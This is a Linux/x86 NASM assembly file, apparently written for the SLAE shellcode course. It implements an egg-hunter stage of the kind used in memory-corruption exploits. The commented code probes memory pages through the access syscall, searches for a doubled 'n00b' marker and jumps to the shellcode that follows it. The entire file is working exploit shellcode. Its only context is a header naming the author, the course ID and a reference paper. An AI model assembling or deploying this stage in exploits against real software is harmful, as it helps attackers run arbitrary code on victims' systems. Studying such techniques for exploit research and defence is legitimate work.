;Egg Hunter - Linux/x86 NASM
;Author: Nathu Nandwani
;SecurityTube ID: SLAE-1261
;Reference: http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf

global _start
section .text
_start:
	xor ebx, ebx		; Clear EBX
	imul ebx		; EDX:EAX = EBX * EAX, EDX = 0, EAX = 0
page_adjustment:
	or dx, 0xfff		; PAGE_SIZE = 4095
memory_adjustment:
	inc edx			; Increment memory address
	lea ebx, [edx + 0x04]	; Adjust pointer to 2nd instance of egg
	xor eax, eax		
	mov al, 0x21		; SYS_ACCESS
	int 0x80		; Interrupt for SYS_ACCESS
	cmp al, 0xf2		; EFAULT (Bad Address -14)
	jz page_adjustment
	mov eax, 0x6230306e	; Egg = n00b
	cmp eax, dword[edx]	; Compare EAX="n00b" ? [EDX]="XXXX"
	jne memory_adjustment	; If EAX != [EDX], try next byte
	cmp eax, dword[edx+4]	; [EDX+4] (2nd instance of egg)
	jne memory_adjustment	; If EAX != [EDX+4], this might be our egghunter "mov eax, 0x6230306e"
	add edx, 8		; Skip 8 bytes egg "n00bn00b"
	jmp edx			; Jump to shellcode
